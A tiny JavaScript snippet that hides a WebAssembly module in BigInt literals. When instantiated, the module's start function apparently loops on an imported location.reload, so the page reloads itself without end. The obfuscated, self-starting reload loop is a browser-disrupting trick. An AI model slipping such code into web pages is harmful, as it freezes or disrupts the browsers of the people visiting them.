WebAssembly.instantiate(
	BigUint64Array.of(
		0x16d736100n,
		0x1302000060010401n,
		0x697461636f6c0801n,
		0x616f6c6572066e6fn,
		0x800010203000064n,
		0x30009010b0a0101n,
		0xb0b000c001040n,
		0x901656d616e0417n,
		0x616f6c6572060001n,
		0x1000002050264n
	), {
		location: {
			reload: location.reload.bind(location, false)
		}
	}
);